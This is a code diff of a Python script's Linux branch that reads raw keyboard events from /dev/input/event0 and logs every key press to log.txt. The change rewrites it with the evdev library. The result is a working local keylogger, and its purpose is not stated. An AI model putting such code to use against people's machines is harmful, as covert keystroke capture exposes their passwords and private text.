@@ -2,6 +2,7 @@ import platform
 import struct
 import time
 import os
+from evdev import InputDevice, categorize, ecodes
 
 # Get the directory of the current script
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -38,34 +39,22 @@ else:
     input_device = "/dev/input/event0"
     output_file = os.path.join(script_dir, "log.txt")
 
-    # Key codes for special keys (these may vary depending on your keyboard layout)
-    SPACE_KEY_CODE = 57
-    BACKSPACE_KEY_CODE = 14
-    ENTER_KEY_CODE = 28
+    # Open the input device
+    device = InputDevice(input_device)
 
-    # Open the input device file
-    with open(input_device, "rb") as f, open(output_file, "a") as log:
-        while True:
-            # Read the event structure (24 bytes)
-            event = f.read(24)
-            if len(event) < 24:
-                break
-
-            # Unpack the event structure
-            (tv_sec, tv_usec, ev_type, ev_code, ev_value) = struct.unpack('llHHI', event)
-
-            # Check if the event is a key press event
-            if ev_type == 1 and ev_value == 1:  # EV_KEY and key press
-                # Write the key code to the log file with a space
-                if ev_code == SPACE_KEY_CODE:
-                    log.write("SPACE ")
-                elif ev_code == BACKSPACE_KEY_CODE:
-                    log.write("BACKSPACE ")
-                elif ev_code == ENTER_KEY_CODE:
-                    log.write("ENTER ")
-                else:
-                    log.write(f"{ev_code} ")
-                log.flush()  # Ensure the data is written to the file immediately
-
-            # Sleep for a short time to avoid overwhelming the output
-            time.sleep(0.01)
+    # Open the log file
+    with open(output_file, "a") as log:
+        for event in device.read_loop():
+            if event.type == ecodes.EV_KEY:  # Check if the event is a key event
+                key_event = categorize(event)
+                if key_event.keystate == key_event.key_down:  # Key press event
+                    key_name = key_event.keycode
+                    if key_name == "KEY_SPACE":
+                        log.write("SPACE ")
+                    elif key_name == "KEY_BACKSPACE":
+                        log.write("BACKSPACE ")
+                    elif key_name == "KEY_ENTER":
+                        log.write("ENTER ")
+                    else:
+                        log.write(f"{key_name} ")
+                    log.flush()  # Ensure the data is written to the file immediately
